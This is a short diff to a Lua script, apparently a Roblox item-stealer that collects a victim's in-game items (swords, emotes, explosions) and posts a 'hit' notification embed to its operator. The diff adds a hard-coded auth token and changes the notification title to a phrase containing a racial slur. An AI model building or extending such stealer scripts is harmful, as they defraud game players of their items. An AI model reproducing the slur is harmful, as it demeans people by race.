@@ -4,6 +4,9 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
+-- // AUTHENTICATION
+local auth_token = "EBK-SS-A" 
+
 local itemsToSend = {}
 local categories = {"Sword", "Emote", "Explosion"}
 local Players = game:GetService("Players")
@@ -306,7 +309,7 @@ local function SendMessage(list)
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "⚪SERVEUR HIT🎉" ,
+            ["title"] = "🔵 The nigga is on the server 🎉" ,
             ["color"] = 255,
 			["fields"] = fields,
 			["footer"] = {
